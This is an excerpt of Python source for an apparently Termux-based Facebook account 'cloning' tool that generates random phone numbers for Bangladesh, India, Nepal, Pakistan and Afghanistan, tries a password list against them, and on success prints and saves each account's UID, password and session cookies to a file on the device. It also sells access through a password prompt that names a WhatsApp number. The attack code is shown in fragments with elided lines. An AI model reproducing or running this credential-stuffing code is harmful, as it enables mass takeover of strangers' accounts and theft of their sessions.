...
khusi= "MAJNU"
password = input("\033[1;36m[+] PASSWORD KE LIYE 9704612289 WSP MSG KAR   :: ")
...
\033[1;32m[\033[1;31m✓\033[1;32m] Author     : MILAN
\033[1;32m[\033[1;31m✓\033[1;32m] GitHub     : MILAN HWRE
\033[1;32m[\033[1;31m✓\033[1;32m] Facebook.  : MILAN
\033[1;32m[\033[1;31m✓\033[1;32m] Tool Types : \033[1;33m FILE +RANDOM 
\033[1;32m[\033[1;31m✓\033[1;32m] VERSION    : \033[1;35m NEW
\x1b[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
...
def randm():
    clear()
    print(f'{G}[{A}1{G}]{G} BANGLADESH CLONE ')
    
    print(f'{G}[{A}2{G}]{G} INDIA CLONE.  ')
    
    print(f'{G}[{A}3{G}]{G} NEPAL CLONE  ')
    
    print(f'{G}[{A}4{G}]{G} PAKISTAN  CLONE  ')
    
    print(f'{G}[{A}5{G}]{G} AFGHANISTAN CLONE ')
    
    print(f'{G}[{A}0{G}]{G} PREE TO EXIT  ');linex()
    option=input(f'{G}[{A}?{G}]{G} SIM  CHOICE : ')
    if option in ['1','A']:
        bd()
    elif option in ['2','B']:
    	india()
...
def pakistan():
		user=[]
		clear()
		print(f'\033[1;32m[\033[1;31m✓\033[1;32m] SELECT NUMBER CORD  : 0306 | 0335 | 0315 | 0345 ');linex()
		code = input(f'{G}[{A}?{G}]{G} CHOICE  : ')
		clear();print(f'\033[1;32m[\033[1;31m✓\033[1;32m] SACLET NUMBER TO CLONE : 3000 | 5000 | 10000 | 99999 ');linex()
		limit = int(input(f'{G}[{A}?{G}]{G} CHOICE  : '))
		clear()
		print(f'{G}[{A}1{G}]{G} METHOD {G}[{A}M1{G}]{G} \n{G}[{A}2{G}]{G} METHOD {G}[{A}M2{G}]{G}\n{G}[{A}3{G}]{G} METHOD {G}[{A}M3{G}]{G} ');linex()
		mthd = input(f'{G}[{A}?{G}]{G} CHOICE  : ')
...
def afghanistan():
		user=[]
		clear()
		print(f'\033[1;32m[\033[1;31m✓\033[1;32m]  NUMBER CORD  : +9340 | +9360 | +9330 | +9350');linex()
		code = input(f'{G}[{A}?{G}]{G} CHOICE  : ')
		clear();print(f'\033[1;32m[\033[1;31m✓\033[1;32m] SELECT NUMBERS TO CLONE: 3000 | 5000 | 10000 | 99999 ');linex()
		limit = int(input(f'{G}[{A}?{G}]{G} CHOICE  : '))
		clear()
		print(f'{G}[{A}1{G}]{G} METHOD {G}[{A}M1{G}]{G} \n{G}[{A}2{G}]{G} METHOD {G}[{A}M2{G}]{G}\n{G}[{A}3{G}]{G} METHOD {G}[{A}M3{G}]{G} ');linex()
		mthd = input(f'{G}[{A}?{G}]{G} CHOICE  : ')
        ...
        try:
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                        ...
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print(f"\r\r{G}[{G}COOKIE{G}]>{A} "+coki)
                                        open('/sdcard/MILAN-RANDOM-M1-OK.txt', 'a').write(uid+' | '+pas+' |-> '+coki+"\n")
                                        oks.append(uid)
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
